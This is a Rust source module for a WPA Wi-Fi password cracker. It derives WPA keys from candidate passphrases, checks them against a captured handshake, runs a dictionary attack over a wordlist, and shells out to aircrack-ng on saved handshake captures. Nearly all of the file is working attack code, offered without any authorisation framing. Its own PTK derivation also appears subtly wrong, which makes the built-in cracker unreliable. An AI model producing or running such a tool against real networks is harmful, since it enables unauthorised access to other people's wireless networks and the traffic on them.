use anyhow::{Context, Result};
use colored::*;
use hmac::{Hmac, Mac};
use pbkdf2::pbkdf2;
use rand::{distributions::Alphanumeric, Rng};
use sha1::Sha1;
use std::fs::File;
use std::io::{self, BufRead, BufReader, Write};
use std::path::Path;
use std::process::Command;
use std::time::Instant;

type HmacSha1 = Hmac<Sha1>;

// WPA key derivation function
pub fn derive_wpa_pmk(passphrase: &str, ssid: &str) -> Result<[u8; 32]> {
    let mut pmk = [0u8; 32];
    pbkdf2::<Hmac<Sha1>>(
        passphrase.as_bytes(),
        ssid.as_bytes(),
        4096,
        &mut pmk,
    ).context("PBKDF2 computation failed")?;

    Ok(pmk)
}

// Calculate PTK (Pairwise Transient Key) from PMK
pub fn calculate_ptk(
    pmk: &[u8],
    anonce: &[u8],
    snonce: &[u8],
    ap_mac: &[u8],
    client_mac: &[u8],
) -> Result<Vec<u8>> {
    // PRF (Pseudo-Random Function) for WPA key expansion
    let mut data = Vec::with_capacity(100);
    data.extend_from_slice(b"Pairwise key expansion");
    data.push(0); // Separator

    // Ensure MACs are in the right order (min, max)
    if ap_mac < client_mac {
        data.extend_from_slice(ap_mac);
        data.extend_from_slice(client_mac);
    } else {
        data.extend_from_slice(client_mac);
        data.extend_from_slice(ap_mac);
    }

    // Ensure nonces are in the right order (min, max)
    if anonce < snonce {
        data.extend_from_slice(anonce);
        data.extend_from_slice(snonce);
    } else {
        data.extend_from_slice(snonce);
        data.extend_from_slice(anonce);
    }

    // Create HMAC with PMK as key
    let mut mac = HmacSha1::new_from_slice(pmk)
        .context("Failed to create HMAC instance")?;
    mac.update(&data);
    let result = mac.finalize().into_bytes();

    Ok(result.to_vec())
}

// Verify if a WPA handshake is valid with the given passphrase
pub fn verify_wpa_handshake(
    passphrase: &str,
    ssid: &str,
    anonce: &[u8],
    snonce: &[u8],
    ap_mac: &[u8],
    client_mac: &[u8],
    mic: &[u8],
    eapol_data: &[u8],
) -> Result<bool> {
    // Derive PMK
    let pmk = derive_wpa_pmk(passphrase, ssid)?;

    // Calculate PTK
    let ptk = calculate_ptk(&pmk, anonce, snonce, ap_mac, client_mac)?;

    // Use first 16 bytes of PTK as the MIC key
    let mic_key = &ptk[0..16];

    // Calculate MIC
    let mut mac = HmacSha1::new_from_slice(mic_key)
        .context("Failed to create HMAC instance")?;
    mac.update(eapol_data);
    let calculated_mic = mac.finalize().into_bytes();

    // Compare calculated MIC with the provided MIC
    Ok(&calculated_mic[0..16] == mic)
}

// Dictionary attack on a WPA handshake
pub fn dictionary_attack(
    wordlist_path: &str,
    ssid: &str,
    anonce: &[u8],
    snonce: &[u8],
    ap_mac: &[u8],
    client_mac: &[u8],
    mic: &[u8],
    eapol_data: &[u8],
) -> Result<Option<String>> {
    println!("{} Starting dictionary attack on network: {}", "[*]".blue(), ssid);
    println!("{} Using wordlist: {}", "[*]".blue(), wordlist_path);

    // First try using aircrack-ng for better performance
    if let Some(password) = try_aircrack_ng(wordlist_path, ssid)? {
        return Ok(Some(password));
    }

    // Fallback to our own implementation
    println!("{} Falling back to built-in cracker", "[*]".blue());

    let start_time = Instant::now();
    let mut attempts = 0;

    // Open wordlist file
    let file = File::open(wordlist_path)
        .context(format!("Failed to open wordlist file: {}", wordlist_path))?;
    let reader = BufReader::new(file);

    // Try each password in the wordlist
    for line in reader.lines() {
        let password = line?;
        attempts += 1;

        if attempts % 100 == 0 {
            print!("\r{} Tried {} passwords...", "[*]".blue(), attempts);
            io::stdout().flush()?;
        }

        // Check if this password works
        match verify_wpa_handshake(
            &password,
            ssid,
            anonce,
            snonce,
            ap_mac,
            client_mac,
            mic,
            eapol_data,
        ) {
            Ok(true) => {
                let elapsed = start_time.elapsed();
                println!("\n{} Password found after {} attempts in {:.2?}!",
                    "[+]".green(), attempts, elapsed);
                return Ok(Some(password));
            },
            Ok(false) => continue,
            Err(e) => {
                println!("\n{} Error checking password '{}': {}",
                    "[!]".red(), password, e);
                continue;
            }
        }
    }

    let elapsed = start_time.elapsed();
    println!("\n{} Password not found after {} attempts in {:.2?}",
        "[!]".red(), attempts, elapsed);

    Ok(None)
}

// Try to crack using aircrack-ng for better performance
fn try_aircrack_ng(wordlist_path: &str, ssid: &str) -> Result<Option<String>> {
    println!("{} Attempting to use aircrack-ng for faster cracking", "[*]".blue());

    // Look for capture files in the captures directory
    let captures_dir = Path::new("captures");
    if !captures_dir.exists() {
        println!("{} No captures directory found", "[!]".yellow());
        return Ok(None);
    }

    // Find the most recent capture file for this SSID
    let mut capture_file = None;
    let mut latest_time = 0;

    if let Ok(entries) = std::fs::read_dir(captures_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if let Some(ext) = path.extension() {
                if ext == "cap" && path.to_string_lossy().contains("handshake") {
                    if let Ok(metadata) = std::fs::metadata(&path) {
                        if let Ok(modified) = metadata.modified() {
                            if let Ok(time) = modified.duration_since(std::time::UNIX_EPOCH) {
                                if time.as_secs() > latest_time {
                                    latest_time = time.as_secs();
                                    capture_file = Some(path);
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    let capture_file = match capture_file {
        Some(file) => file,
        None => {
            println!("{} No capture files found", "[!]".yellow());
            return Ok(None);
        }
    };

    println!("{} Using capture file: {}", "[*]".blue(), capture_file.display());

    // Run aircrack-ng
    let output = Command::new("aircrack-ng")
        .args([
            "-w", wordlist_path,
            "-e", ssid,
            capture_file.to_str().unwrap()
        ])
        .output();

    match output {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);

            // Check if password was found
            if let Some(pos) = stdout.find("KEY FOUND!") {
                // Extract the password
                if let Some(key_pos) = stdout[pos..].find("[") {
                    let start_pos = pos + key_pos + 1;
                    if let Some(end_pos) = stdout[start_pos..].find("]") {
                        let password = stdout[start_pos..start_pos + end_pos].trim().to_string();
                        println!("{} Password found with aircrack-ng: {}", "[+]".green(), password);
                        return Ok(Some(password));
                    }
                }
            }

            println!("{} aircrack-ng did not find the password", "[!]".yellow());
            Ok(None)
        },
        Err(_) => {
            println!("{} Failed to run aircrack-ng", "[!]".yellow());
            Ok(None)
        }
    }
}

// Generate a random WPA handshake for educational purposes
pub fn generate_test_handshake() -> (String, String, Vec<u8>, Vec<u8>, Vec<u8>, Vec<u8>, Vec<u8>, Vec<u8>) {
    // Generate random SSID
    let ssid: String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(8)
        .map(char::from)
        .collect();

    // Generate random password
    let password: String = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(10)
        .map(char::from)
        .collect();

    // Generate random MACs and nonces
    let ap_mac = random_mac();
    let client_mac = random_mac();
    let anonce = random_bytes(32);
    let snonce = random_bytes(32);

    // Generate dummy EAPOL data
    let eapol_data = random_bytes(100);

    // Generate dummy MIC
    let mic = random_bytes(16);

    (ssid, password, anonce, snonce, ap_mac, client_mac, mic, eapol_data)
}

// Generate random MAC address
fn random_mac() -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let mut mac = Vec::with_capacity(6);
    for _ in 0..6 {
        mac.push(rng.gen_range(0..=255));
    }
    mac
}

// Generate random bytes
fn random_bytes(len: usize) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let mut bytes = Vec::with_capacity(len);
    for _ in 0..len {
        bytes.push(rng.gen_range(0..=255));
    }
    bytes
}

// Create a simple wordlist for testing
pub fn create_test_wordlist(path: &str, include_password: &str) -> Result<()> {
    let path = Path::new(path);
    let mut file = File::create(path)
        .context(format!("Failed to create wordlist file: {}", path.display()))?;

    // Add some common passwords
    let mut passwords = vec![
        "password", "123456", "qwerty", "admin", "welcome",
        "letmein", "monkey", "1234567890", "abc123", "password123"
    ];

    // Add the actual password somewhere in the list
    if !passwords.contains(&include_password) {
        let pos = rand::thread_rng().gen_range(0..passwords.len());
        passwords.insert(pos, include_password);
    }

    // Write passwords to file
    for password in passwords {
        writeln!(file, "{}", password)?;
    }

    Ok(())
}

// Format MAC address for display
pub fn format_mac(mac: &[u8]) -> String {
    mac.iter()
        .map(|b| format!("{:02X}", b))
        .collect::<Vec<String>>()
        .join(":")
}

// Convert hex string to bytes
pub fn hex_to_bytes(hex: &str) -> Result<Vec<u8>> {
    let hex = hex.replace(":", "");
    let bytes = hex::decode(hex)
        .context("Failed to decode hex string")?;
    Ok(bytes)
}
